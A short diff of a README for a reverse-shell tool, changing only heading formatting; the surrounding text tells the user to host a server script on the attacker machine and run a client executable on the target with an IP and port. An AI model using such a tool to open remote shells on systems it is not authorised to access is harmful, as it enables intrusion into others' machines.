@@ -4,7 +4,7 @@ These are scripts/exes that can be used as a better reverse shell. It's basicall
 
 
 
-##Host the shell_server.rb on the attacker machine and then use the shell_client.exe / shell_client.rb to connect to it by calling it with these arguments on the target.
+## Host the shell_server.rb on the attacker machine and then use the shell_client.exe / shell_client.rb to connect to it by calling it with these arguments on the target.
 
 ```
 .\shell_client.exe *IP* *PORT*
